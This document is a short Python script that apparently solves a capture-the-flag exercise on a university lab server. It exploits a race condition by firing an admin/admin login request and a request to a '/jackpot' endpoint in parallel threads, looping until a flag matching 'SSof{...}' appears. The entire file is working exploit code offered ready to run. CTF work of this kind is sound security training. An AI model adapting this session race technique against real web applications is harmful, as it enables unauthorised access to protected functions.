from requests import session
from threading import Thread
from re import findall

SERVER = "http://mustard.stt.rnl.tecnico.ulisboa.pt:12202"
s = session()
f = None


def doLogin():
    data = {
        "username": "admin",
        "password": "admin"
    }
    s.post(SERVER + "/login", data=data)


def doJackpot():
    global f
    r = s.get(SERVER + "/jackpot")
    f = findall(r"SSof{.*}", r.text)


while True:
    thrs = [
        Thread(target=doLogin),
        Thread(target=doJackpot)
    ]
    for thr in thrs: thr.start()
    for thr in thrs: thr.join()
    if f:
        print(f[0])
        s.close()
        break
